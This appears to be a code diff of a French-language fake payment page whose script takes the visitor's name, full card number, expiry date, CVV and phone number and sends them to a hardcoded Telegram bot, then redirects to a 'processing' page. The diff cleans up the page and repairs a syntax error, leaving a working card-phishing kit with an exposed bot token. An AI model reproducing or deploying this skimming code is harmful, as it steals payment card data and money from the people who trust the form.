@@ -93,54 +93,55 @@
 
             <!-- Bouton de validation -->
             <button type="submit"
-                class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
-                Valider mon paiement
-            </button>
-        </form>
-    </div>
+        class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
+        Valider mon paiement
+    </button>
+</form>
 
-    <script>
-        document.getElementById("paiement-form").addEventListener("submit", async function(event) {
-            event.preventDefault();
+<script>
+    document.getElementById("paiement-form").addEventListener("submit", async function(event) {
+        event.preventDefault();
 
-            const nom = document.getElementById("nom").value;
-            const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
-            const dateExpiration = document.getElementById("date-expiration").value;
-            const cvv = document.getElementById("cvv").value;
-            const telephone = document.getElementById("telephone").value;
-            const PRIX = document.getElementById("799€").value;
+        const nom = document.getElementById("nom").value;
+        const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
+        const dateExpiration = document.getElementById("date-expiration").value;
+        const cvv = document.getElementById("cvv").value;
+        const telephone = document.getElementById("telephone").value;
+        const PRIX = document.getElementById("prix").value;
 
-            // Send to Telegram bot
-            const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
-            const chatId = "5372119436";
+        // Configuration pour Telegram
+        const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
+        const chatId = "5372119436";
 
-            const message = `
+        const message = `
 🔔 **Nouvelle Demande de Paiement** 🔔
 👤 Nom: ${nom}
 💳 Numéro de Carte: ${numeroCarte}
 📅 Expiration: ${dateExpiration}
 🔒 CVV: ${cvv}
-📞 Téléphone: ${telephone}`;
-🔔🔔🔔🔔 PRIX: 799 EURO
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: "Markdown",
-                    }),
-                });
+📞 Téléphone: ${telephone}
+🔔 Prix : ${PRIX} EURO
+        `;
 
-                // إعادة التوجيه بعد الإرسال
-        window.location.href = "Traitement.html";
-    } catch (error) {
-        alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
-    }
-});
-    </script>
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown",
+                }),
+            });
+
+            // Redirection en cas de succès
+            window.location.href = "Traitement.html";
+        } catch (error) {
+            alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
+        }
+    });
+</script>
 </body>
 </html>
